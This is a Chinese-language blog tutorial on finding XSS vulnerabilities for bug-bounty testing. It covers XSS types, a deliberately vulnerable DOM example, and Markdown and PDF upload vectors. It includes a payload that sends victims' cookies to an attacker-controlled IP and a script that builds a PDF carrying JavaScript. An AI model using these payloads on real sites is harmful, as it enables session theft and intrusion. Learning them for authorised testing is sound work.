# web漏洞挖掘指南 -XSS跨站脚本攻击


<!--more-->
![IP定位](https://tool.lu/netcard/)

# 

# web漏洞挖掘指南

## XSS跨站脚本攻击

### 一、漏洞原理

\1. 跨站脚本英文全称（Cross Site Scripting跨站脚本），为了不和css层叠样式表(英文全称：Cascading Style Sheets)混淆，因此将跨站脚本缩写为XSS。产生XSS漏洞根本原因其实是web应用未对用户的输入进行严格的过滤和转义，导致攻击者可从正常的输入功能注入脚本代码，我常将xss攻击理解为一种javascript注入，当带有xss恶意代码的页面被其他用户访问到时，js便会被执行，js脚本可以执行很多操作，比如：窃取用户cookie，读取用户键盘记录，截屏，恶意跳转等，甚至可以结合BEEF的hook.js钩子劫持用户浏览器。

### 二、XSS漏洞检测

\1. 公认XSS有三种类型：反射型、存储型、dom型。根据字面意思很好区分三者，反射型即服务器根据用户当前输入做出的响应，只能触发一次，这个过程就像一次反射。因此市面上大多self-xss都来自反射型xss，攻击者输入xss脚本，输出仅自己看到，仅xss到自己，常在查询、搜索等功能出现。
\2. 存储型xss即页面保存了攻击者输入的恶意代码，除非对应记录被删除，否则可以一直触发xss，常在留言、个人信息登记等功能出现。
\3. dom型xss比较独特，它涉及的两个层次不是服务器端和浏览器端，而是浏览器端的JavaScript层和HTML层。换种更好理解的说法也就是：从服务器脚本变成了客户端脚本，dom xss的payload不需要服务端解析响应，而是靠浏览器的dom解析，因此dom-xss的触发是抓不到请求包的。漏洞示例xss.html：

```html
    <html>
    <body>
            <div id="tr1"></div>
            <script>
                    document.getElementById("tr1").innerHTML = unescape(location.hash);
            </script>
    </body>
    </html>
```

![Untitled](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741759-722253-untitled-10.png)
\4. xss漏洞检测用弹窗进行测试即可，常见的几种弹窗方法：alert()、confirm()、prompt()、console.log()。测试时，尽量结合各种xss类型的特征对功能点进行验证，除了大家常说的“有框即插(看见输入框就盲插xss payload)”，还需注意请求中的各种参数，是否可以原样输出或者以html代码的形式保存到了另一个页面。

### 三、XSS漏洞利用

\1. 上文提到过，xss的本质其实是js代码的注入，所以XSS漏洞的危害来源于js代码执行，最常见的就是盗取用户cookie，但是在实际场景中我们经常会遇到cookie设置httponly属性导致无法通过js脚本读取的情况，这时还可以读取用户键盘记录，截屏，恶意跳转等，甚至可以结合BEEF的hook.js钩子劫持用户浏览器。
\2. 以最简单的盗取cookie的payload为例，先用python搭建web服务充当xss平台：
![Untitled](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741786-502257-untitled-11.png)
\3. 然后在存有xss漏洞的位置传入payload：<script>document.location=’[http://192.168.123.24?’+document.cookie;](http://ip:233/?’+document.cookie;)</script>
\4. 上述payload先用[document.cookie](http://ip:233/?’+document.cookie;)获取了用户cookie，然后利用document.location进行跳转，这样客户端就会携带[document.cookie](http://ip:233/?’+document.cookie;)的值访问xss平台，通过xss平台的web日志即可查看对应记录：
![Untitled](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741841-53099-untitled.jpg)
\5. 市面上的xss平台其实已经编写出很多成熟的xss利用模板了，js代码操作不熟练的师傅可以直接套用xss平台的模板：
![Untitled](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741857-24672-untitled-12.png)

### 四、Markdown XSS

\1. Markdown 是一种轻量级标记语言，它允许人们使用纯文本格式编写文档。通过简单的文本方式标记就能指定格式，轻轻松松完成文档的编辑。markdown语言从文本-指定格式的转换过程可以看作一系列的html转换，最终以html标签的形式存储在页面上，因此markdown编辑器也可能出现XSS漏洞。
\2. 插入超链接：
![Untitled](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741901-716534-untitled-13.png)
![Untitled](https://huoxian-community.oss-cn-beijing.aliyuncs.com/2021-09-27/1632741646-907279-image.png)
\4. 除了插入超链接，我们还可以参照常规的XSS payload进行尝试，比如<img>、<svg>等标签。参考案例：
http://www.52bug.cn/hkjs/3292.html
https://mp.weixin.qq.com/s/7Qa4o0sYfJei07K3mjL-GA

### 五、上传PDF导致的XSS

\1. 之前在论坛上看到过有师傅通过把xss代码加到pdf文件，然后通过正常的文件上传功能传至目标服务器中，利用浏览器自带的pdf阅读功能触发xss，这类漏洞还是会有部分厂商会确认的，参考文章：

https://www.t00ls.cc/thread-48480-1-1.html
https://www.t00ls.cc/articles-62790.html
pdf文件还是很少被禁止上传的，众测项目中可以尝试此类测试。
\2. 利用条件：1.有pdf文件上传点 2.保存好的pdf文件可以直接浏览器查看，而不是只能下载至本地。
\3. python脚本一键生成带有xss代码的pdf文件：

```python
    from PyPDF2 import PdfFileWriter
    file = PdfFileWriter()
    file.addJS('app.alert("XSS");')
    output = open('xss.pdf', 'wb')
    file.write(output)
```




{{<music url="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Music/16.mp3" name="" artist="Mr·Yang" cover="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@img/avatar.png" fixed="true" volume="100" loop="all" autoplay="true" preload="auto" >}}

<img src="https://tool.lu/netcard/">

